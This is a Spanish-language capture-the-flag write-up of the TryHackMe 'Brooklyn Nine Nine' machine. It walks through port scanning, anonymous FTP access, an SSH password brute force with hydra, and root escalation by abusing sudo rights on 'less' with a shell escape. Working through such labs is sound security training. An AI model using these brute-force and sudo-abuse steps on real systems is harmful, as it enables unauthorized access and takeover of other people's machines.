---
title: TryHackMe Brookling Nine Nine Writeup
published: true
---

La máquina Brookling99 es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos tanto la flag del usuario como la de root.

# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 06:22 EDT
Initiating Connect Scan at 06:22
Scanning 10.10.209.206 [65535 ports]
Discovered open port 22/tcp on 10.10.209.206
Discovered open port 21/tcp on 10.10.209.206
Discovered open port 80/tcp on 10.10.209.206
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 76.50% done; ETC: 06:23 (0:00:05 remaining)
Completed Connect Scan at 06:23, 19.84s elapsed (65535 total ports)
Nmap scan report for 10.10.209.206
Host is up, received user-set (0.058s latency).
Scanned at 2022-10-14 06:22:57 EDT for 19s
Not shown: 40658 closed tcp ports (conn-refused), 24874 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.89 seconds
```

Nos reporta una serie de puertos abiertos. Debido a que el puerto 80 está abierto, introducimos la $IP-VICTIMA en un buscador y nos reporta una imagen con el título de la máquina junto a un pequeño texo. El texto no nos da información por lo que checkeamos la consola para tratar de conseguir algo más.

Conseguimos obtener un comentario en la consola que dice:

```html
Have you ever heard of steganography?
```
Lo tendremos en cuenta. A parte del puerto 80, están abiertos el 21 y 22. En el puerto 21 está corriedno un servicio ftp por lo que vamos a realizar un escaneo con nmap para obtener más información de estos:

```bash
❯ nmap -sCV -p21,22,80 10.10.209.206 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 06:27 EDT
Nmap scan report for 10.10.209.206
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.79.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.23 seconds
[1]    4872 segmentation fault  nmap -sCV -p21,22,80 10.10.209.206 -oN targeted
```

Parece ser que nos podemos logear con el usuario Anonyous y sin contraseña. Además existe un archivo .txt

Nos conectamos entonces con ese usuario y sin contraseña:

```bash
❯ ftp 10.10.209.206
Connected to 10.10.209.206.
220 (vsFTPd 3.0.3)
Name (10.10.209.206:jorge): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Listamos el contendio y nos aparece el archivo .txt

Usando el comando get nos la podemos pasar a nuestro equipo. La abrimos y vemos su contenido:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||30950|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||13605|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |********************************************************|   119       34.03 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (2.18 KiB/s)
```

Lo abrimos en nuestro equipo:

```bash
❯ cat note_to_jake.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────
       │ File: note_to_jake.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────
   1   │ From Amy,
   2   │ 
   3   │ Jake please change your password. It is too weak and holt will be mad if someone hack into 
       │ the nine nine
   4   │ 
   5   │ 
───────┴─────────────────────────────────────────────────────────────────────────────────────────────
```

Nos dan la información que el usuario Jake tiene una contraseña débil, por lo que mediante hydra intentamos conseguirla:

```bash
❯ hydra -l jake -P /home/jorge/Descargas/rockyou.txt 10.10.209.206 -t 4 ssh
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-14 06:53:57
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344401 login tries (l:1/p:14344401), ~3586101 tries per task
[DATA] attacking ssh://10.10.209.206:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344357 to do in 5433:29h, 4 active
[22][ssh] host: 10.10.209.206   login: jake   password: ?????????
```

# []($header-1)Acceso al sistema

La conseguimos e intentamos conectarnos mediante SSH con el usuario y la contraseña

```bash
❯ ssh jake@10.10.209.206
The authenticity of host '10.10.209.206 (10.10.209.206)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.209.206' (ED25519) to the list of known hosts.
jake@10.10.209.206's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ 
```

Estamos dentro! Investigamos un poco por los usuarios y conseguimos la flag del usuario:

```bash
jake@brookly_nine_nine:~$ cd /home
jake@brookly_nine_nine:/home$ cd holt/
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
???????????????????????????????
jake@brookly_nine_nine:/home/holt$ 
```

En este punto podemos usar sudo -l para ver los permisos que tenemos a la hora de ejecutar comandos:

```bash
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

# []($header-1)Escalada de privilegios

Podemos usar el comando less como root: Nos dirigimos a <a href="gtfobins.github.io">GTFOBins</a> y buscamos el binario less y lo que podemos hacer siendo sudo.

Nos reporta esta información:

> sudo less /etc/profile
>
> !/bin/sh

Ejecutamos entonces el comando (sudo less /etc/profile) e introducimos !/bin/sh

Hemos conseguido el acceso total al sistema y si hacemos whoami nos reporta que somos root, parece ser que no nos ha hecho falta usar esteganografía.

Investigamos por el directorio de root y conseguimos la flag del mismo:

```bash
# whoami
root
# ls
# cd /root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: ??????????????????????????????

Enjoy!!
```
Conseguimos la flag de root!

Muchas gracias por leer este writeup, espero que te haya gustado!
